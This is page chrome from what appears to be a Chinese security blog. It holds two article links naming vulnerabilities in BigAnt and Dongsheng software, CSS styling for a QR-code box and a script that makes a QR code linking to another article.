* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-notify-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});